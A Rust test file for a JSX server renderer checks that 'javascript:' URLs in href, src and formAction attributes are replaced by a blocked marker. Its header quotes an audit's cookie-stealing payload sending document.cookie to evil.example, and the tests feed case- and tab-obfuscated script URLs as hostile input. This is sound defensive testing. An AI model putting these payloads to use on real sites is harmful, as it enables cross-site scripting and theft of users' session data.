//! ALB-03 · a `javascript:` URL never reaches a URL attribute.
//!
//! ## The defect
//!
//! Neither server renderer checked URL-valued attributes. The 2026-10-27 audit
//! signed a guestbook with `author=javascript:fetch('//evil.example/?c='+document.cookie)`
//! and a page rendering `<a href={entry.author}>` served it verbatim — and
//! ` JaVaScRiPt:alert(1)` too, which the browser's URL parser normalises to the
//! same scheme. The session cookie is HttpOnly, but `__ALBEDO_CSRF__` is on the
//! page, so the script could call every action as the victim. React 19 replaces
//! these; nothing here did.
//!
//! ## What is pinned
//!
//! The rule lives once, in `runtime::jsx_attributes`, and six sites apply it.
//! This file runs the three that execute on the server or ship from it: the
//! pure-Rust evaluator, the QuickJS `h` shim, and the list templater's rows
//! thunk (which the browser runs to rebuild a row from state). The client
//! runtimes are covered by `tests/client_hydration.rs` and
//! `tests/bakabox/script-url.test.mjs`; their copies of the table are pinned by
//! `jsx_attributes::tests::the_client_url_rule_matches_this_one`.

use dom_render_compiler::runtime::engine::{BootstrapPayload, RuntimeEngine};
use dom_render_compiler::runtime::eval::{
    render_entry_with_bindings, CompiledProject, RenderOptions, SessionSlotView,
};
use dom_render_compiler::runtime::jsx_attributes::BLOCKED_URL;
use dom_render_compiler::runtime::quickjs_engine::QuickJsEngine;
use dom_render_compiler::runtime::session::SessionId;
use dom_render_compiler::runtime::slot_store::SlotStore;
use rquickjs::{Context, Runtime};
use serde_json::{json, Value};
use std::path::PathBuf;
use std::sync::Arc;

fn fixture(group: &str, name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join(group)
        .join(name)
}

fn slots() -> SessionSlotView {
    SessionSlotView::new(SessionId::random(), Arc::new(SlotStore::new()))
}

/// [`BLOCKED_URL`] as it appears inside a double-quoted attribute.
fn blocked_in_markup() -> String {
    BLOCKED_URL.replace('&', "&amp;").replace('"', "&quot;")
}

/// The `name="…"` value on the element carrying `id="{id}"`.
fn attribute_of(html: &str, id: &str, name: &str) -> String {
    let at = html
        .find(&format!("id=\"{id}\""))
        .unwrap_or_else(|| panic!("no element id={id} in {html}"));
    let open = html[..at].rfind('<').expect("the tag opens");
    let close = at + html[at..].find('>').expect("the tag closes");
    let tag = &html[open..close];
    let marker = format!(" {name}=\"");
    let start = tag
        .find(&marker)
        .unwrap_or_else(|| panic!("no {name} on #{id}: {tag}"))
        + marker.len();
    let end = start + tag[start..].find('"').expect("the value closes");
    tag[start..end].to_string()
}

#[test]
fn both_server_renderers_replace_a_script_url_from_props() {
    let project = CompiledProject::load_from_dir(fixture("render_quickjs", "script_urls"))
        .expect("fixture compiles");
    let props = json!({
        "website": " JaVa\tScRiPt:alert(1)",
        "photo": "javascript:alert(2)",
        "safe": "https://example.com/a?b=c&d=e",
    });

    let evaluator = render_entry_with_bindings(
        &project,
        "Component.tsx",
        &props,
        &slots(),
        &RenderOptions { hook_compile: false },
    )
    .expect("evaluator renders")
    .html;
    let mut engine = QuickJsEngine::new();
    engine.init(&BootstrapPayload::default()).expect("engine init");
    let quickjs = project
        .render_entry_quickjs(&mut engine, "Component.tsx", &props, &slots())
        .expect("quickjs renders")
        .html;

    assert_eq!(evaluator, quickjs, "the two renderers must agree byte for byte");

    let blocked = blocked_in_markup();
    for html in [&evaluator, &quickjs] {
        assert_eq!(attribute_of(html, "website", "href"), blocked);
        assert_eq!(attribute_of(html, "photo", "src"), blocked);
        assert_eq!(
            attribute_of(html, "button", "formAction"),
            blocked,
            "matched case-insensitively"
        );
        assert_eq!(
            attribute_of(html, "safe", "href"),
            "https://example.com/a?b=c&amp;d=e",
            "an ordinary URL passes through, escaped"
        );
        assert_eq!(
            attribute_of(html, "title", "title"),
            " JaVa\tScRiPt:alert(1)",
            "a text attribute is text"
        );
        assert!(!html.contains("alert(2)"), "no payload survives in a URL: {html}");
    }
}

/// The row a keyed list rebuilds in the browser, from the thunk the server
/// ships — run here on a real JS engine with a hostile row in state.
#[test]
fn a_list_row_rebuilt_from_state_replaces_a_script_url() {
    let project = CompiledProject::load_from_dir(fixture("hook_compile", "list_keyed_url"))
        .expect("fixture compiles");
    let payload = project
        .build_reactive_payload("Component.tsx", &Value::Object(Default::default()), &slots())
        .expect("reactive payload builds");
    assert_eq!(payload.lists.len(), 1, "one keyed list");
    let list = &payload.lists[0];
    let slot = list.dep_slots[0];

    let state = json!([
        { "id": 1, "url": "https://example.com/" },
        { "id": 2, "url": " JaVa\tScRiPt:alert(1)" },
    ]);
    let script = format!(
        "JSON.stringify(({thunk})({{ {slot}: {state} }}))",
        thunk = list.rows_thunk,
    );

    let runtime = Runtime::new().expect("quickjs runtime");
    let context = Context::full(&runtime).expect("quickjs context");
    let rows: String = context.with(|ctx| ctx.eval(script.as_str()).expect("thunk runs"));
    let rows: Vec<Value> = serde_json::from_str(&rows).expect("rows are JSON");

    assert_eq!(rows.len(), 2);
    let safe = rows[0]["html"].as_str().unwrap();
    let hostile = rows[1]["html"].as_str().unwrap();
    assert!(safe.contains("href=\"https://example.com/\""), "{safe}");
    assert!(!hostile.contains("alert(1)"), "the payload must not survive: {hostile}");
    assert!(
        hostile.contains("ALBEDO blocked a javascript: URL"),
        "replaced by the shared BLOCKED_URL: {hostile}"
    );
}
